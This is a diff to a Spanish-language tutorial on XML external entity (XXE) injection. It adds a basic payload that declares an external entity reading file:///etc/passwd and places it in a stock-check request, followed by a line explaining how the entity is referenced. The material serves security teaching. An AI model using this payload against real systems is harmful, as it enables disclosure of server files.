@@ -93,11 +93,17 @@ La URL puede usar el file://protocolo, por lo que las entidades externas se pued
   La mas basica de este ataque donde no hay protecciones.
   
   ```
-  
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>
+&xxe;
+</productId><storeId>2</storeId></stockCheck>
 
   ```
-
-
+El &xxe; llama a la entidad que definimos en el DTD
+  
+  
+  
 Referencias
 
 Validador de XML
